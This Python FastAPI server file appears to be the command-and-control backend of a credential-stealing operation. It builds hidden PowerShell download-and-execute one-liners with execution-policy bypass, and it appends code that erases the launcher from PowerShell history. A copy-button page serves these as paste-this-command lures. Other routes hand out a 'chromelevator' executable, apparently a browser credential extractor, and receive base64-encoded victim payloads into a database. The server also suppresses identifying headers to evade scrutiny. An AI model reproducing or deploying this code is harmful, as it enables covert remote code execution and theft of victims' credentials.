import base64
import json
import logging
import os
from pathlib import Path
from typing import Any

from fastapi import FastAPI, Request
from fastapi.exceptions import RequestValidationError
from fastapi.responses import FileResponse, HTMLResponse, PlainTextResponse
from starlette.exceptions import HTTPException as StarletteHTTPException
from starlette.responses import Response

from app.config import ADMIN_ENABLED
from app.repository import save_error_record, save_payload_record, verify_database_connection

if ADMIN_ENABLED:
    from app.admin import router as admin_router

logger = logging.getLogger(__name__)

app = FastAPI(
    title="",
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)


@app.on_event("startup")
async def startup_verify_database() -> None:
    try:
        verify_database_connection()
        logger.info("Database connection OK")
    except Exception:
        logger.exception("Database connection failed at startup")

    if ADMIN_ENABLED:
        logger.info("Admin routes enabled (ENABLED_ADMIN_PANEL=true)")
    else:
        logger.info("Admin routes disabled (ENABLED_ADMIN_PANEL not set)")

SCRIPT_PATH = Path(__file__).with_name("windows_script.ps1")
BIN_DIR = Path(__file__).with_name("bin")

EMPTY = Response(status_code=404, content=b"")


@app.middleware("http")
async def strip_identifying_headers(request: Request, call_next) -> Response:
    response = await call_next(request)
    if "server" in response.headers:
        del response.headers["server"]
    return response


@app.exception_handler(StarletteHTTPException)
async def silent_http_exception(_request: Request, exc: StarletteHTTPException) -> Response:
    headers = dict(exc.headers) if exc.headers else {}
    return Response(status_code=exc.status_code, content=b"", headers=headers)


@app.exception_handler(RequestValidationError)
async def silent_validation_exception(_request: Request, _exc: RequestValidationError) -> Response:
    return EMPTY


def resolve_api_base(request: Request | None = None) -> str:
    if host := os.getenv("PAYLOAD_HOSTNAME"):
        scheme = "https" if host.endswith(".fly.dev") else "http"
        return f"{scheme}://{host}"

    if request is not None:
        return f"{request.url.scheme}://{request.url.netloc}"

    if fly_app := os.getenv("FLY_APP_NAME"):
        return f"https://{fly_app}.fly.dev"

    return "http://localhost:8001"


API_BASE = resolve_api_base()
PAYLOAD_URL = f"{API_BASE}/p"

LAUNCHER_HISTORY_SUFFIX = (
    "; try { Clear-History -ErrorAction SilentlyContinue } catch {}; "
    "try { "
    "$hp = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath; "
    "if ($hp -and (Test-Path -LiteralPath $hp)) { "
    "$pat = '(DownloadString|/wscp|iex\\s*\\(|Invoke-Expression|Start-Process powershell|Invoke-WebRequest.*/wscp|iwr.*/wscp)'; "
    "@(Get-Content -LiteralPath $hp -ErrorAction SilentlyContinue | "
    "Where-Object { $_ -notmatch $pat }) "
    "| Set-Content -LiteralPath $hp -Encoding utf8 -ErrorAction SilentlyContinue "
    "} } catch {}"
)

LAUNCHER_EXIT_SUFFIX = LAUNCHER_HISTORY_SUFFIX + "; exit"


def build_powershell_command(
    api_base: str | None = None,
    *,
    debug: bool = False,
    background: bool = False,
) -> str:
    base = api_base or API_BASE
    script_url = f"{base}/wscp"
    params: list[str] = []
    if background:
        params.append("close=1")
        if not debug:
            params.append("hidden=1")
    if debug:
        params.append("debug=1")
    if params:
        script_url += "?" + "&".join(params)

    inner = f"iex (New-Object Net.WebClient).DownloadString('{script_url}')"
    if background:
        escaped = inner.replace("'", "''")
        return (
            "Start-Process powershell -WindowStyle Hidden "
            f"-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-Command','{escaped}'"
            f"{LAUNCHER_EXIT_SUFFIX}"
        )

    if debug:
        return inner + LAUNCHER_HISTORY_SUFFIX

    return inner + LAUNCHER_HISTORY_SUFFIX


def save_payload(payload: dict[str, Any]) -> dict[str, Any]:
    return save_payload_record(payload)


def save_error(error_report: dict[str, Any]) -> dict[str, Any]:
    return save_error_record(error_report)


def render_windows_script(
    *,
    close_terminal: bool = False,
    debug_mode: bool = False,
    silent_mode: bool = False,
) -> str:
    close_literal = "$true" if close_terminal else "$false"
    debug_literal = "$true" if debug_mode else "$false"
    silent_literal = "$true" if silent_mode else "$false"
    return (
        SCRIPT_PATH.read_text(encoding="utf-8")
        .replace("__API_BASE__", API_BASE)
        .replace("__PAYLOAD_URL__", PAYLOAD_URL)
        .replace("__CLOSE_TERMINAL__", close_literal)
        .replace("__DEBUG_MODE__", debug_literal)
        .replace("__SILENT_MODE__", silent_literal)
    )


@app.get("/wscp", response_class=PlainTextResponse)
async def get_windows_script(
    close: bool = False,
    debug: bool = False,
    hidden: bool = False,
) -> PlainTextResponse:
    return PlainTextResponse(
        render_windows_script(close_terminal=close, debug_mode=debug, silent_mode=hidden),
        media_type="text/plain; charset=utf-8",
    )


@app.get("/c", response_class=HTMLResponse)
async def copy_command(request: Request) -> HTMLResponse:
    api_base = resolve_api_base(request)
    command_visible = build_powershell_command(api_base)
    command_with_debug = build_powershell_command(api_base, debug=True)
    command_background = build_powershell_command(api_base, background=True)

    return HTMLResponse(
        f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Copy</title>
  <style>
    body {{
      font-family: system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      gap: 0.75rem;
      min-height: 100vh;
      margin: 0;
    }}
    button {{
      padding: 0.75rem 1.5rem;
      font-size: 1rem;
      cursor: pointer;
      min-width: 12rem;
    }}
    #status {{
      color: #16a34a;
      min-height: 1.25rem;
    }}
    .hint {{
      color: #64748b;
      font-size: 0.875rem;
      max-width: 20rem;
      text-align: center;
      margin: 0;
    }}
  </style>
</head>
<body>
  <button type="button" id="copy-btn">Copy</button>
  <button type="button" id="copy-visible-btn">Copy visible</button>
  <button type="button" id="copy-debug-btn">Copy with debug</button>
  <p class="hint">Copy closes this window after launch. Visible and debug keep PowerShell open.</p>
  <div id="status"></div>
  <script>
    const commandBackground = {json.dumps(command_background)};
    const commandVisible = {json.dumps(command_visible)};
    const commandWithDebug = {json.dumps(command_with_debug)};

    async function copyText(text) {{
      const status = document.getElementById("status");
      status.textContent = "";
      try {{
        await navigator.clipboard.writeText(text);
        status.textContent = "Copied";
      }} catch (e) {{
        const textarea = document.createElement("textarea");
        textarea.value = text;
        textarea.style.position = "fixed";
        textarea.style.opacity = "0";
        document.body.appendChild(textarea);
        textarea.select();
        status.textContent = document.execCommand("copy") ? "Copied" : "Could not copy";
        textarea.remove();
      }}
    }}

    document.getElementById("copy-btn").addEventListener("click", () => copyText(commandBackground));
    document.getElementById("copy-visible-btn").addEventListener("click", () => copyText(commandVisible));
    document.getElementById("copy-debug-btn").addEventListener("click", () => copyText(commandWithDebug));
  </script>
</body>
</html>"""
    )


@app.get("/chrmlvtr", response_model=None)
async def get_chromelevator(arch: str = "x64"):
    arch = arch.lower()
    if arch not in {"x64", "arm64"}:
        return EMPTY

    binary_path = BIN_DIR / f"chromelevator_{arch}.exe"
    if not binary_path.is_file():
        return EMPTY

    return FileResponse(
        binary_path,
        media_type="application/octet-stream",
        filename="chromelevator.exe",
    )


@app.post("/p")
async def receive_payload(request: Request) -> Response:
    raw_body = (await request.body()).decode("utf-8").strip()
    try:
        payload = json.loads(base64.b64decode(raw_body))
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        return PlainTextResponse("", status_code=400)

    if not isinstance(payload, dict):
        return PlainTextResponse("", status_code=400)

    save_payload(payload)

    return Response(status_code=200, content=b"")


@app.post("/e")
async def receive_error(request: Request) -> Response:
    raw_body = (await request.body()).decode("utf-8").strip()
    try:
        error_report = json.loads(base64.b64decode(raw_body))
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        return PlainTextResponse("", status_code=400)

    if not isinstance(error_report, dict):
        return PlainTextResponse("", status_code=400)

    save_error(error_report)

    return Response(status_code=200, content=b"")


if ADMIN_ENABLED:
    app.include_router(admin_router)


@app.api_route("/{full_path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"])
async def unknown_route(_full_path: str) -> Response:
    return EMPTY
